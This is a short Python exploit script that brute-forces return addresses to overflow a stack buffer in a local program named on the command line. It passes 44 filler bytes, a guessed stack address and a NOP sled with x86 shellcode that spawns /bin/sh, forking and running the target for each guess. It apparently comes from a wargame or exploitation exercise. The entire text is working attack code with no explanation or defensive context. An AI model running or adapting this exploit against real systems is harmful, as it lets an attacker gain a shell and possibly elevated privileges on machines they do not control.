import os, sys

TARGET = os.getcwd()+"/"+sys.argv[1]

for h in range(0xff,0x00,-1):
    for l in range(0x00,0x100,50):
        payload = ""
        payload = "a"*44
        retn = chr(l)+chr(h)+"\xff\xbf"
        payload = payload+retn
        shellcode = "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"

        pid = os.fork()
        if pid==0:
            os.execl(TARGET,TARGET,payload,shellcode)
        else:
            os.waitpid(pid,0)

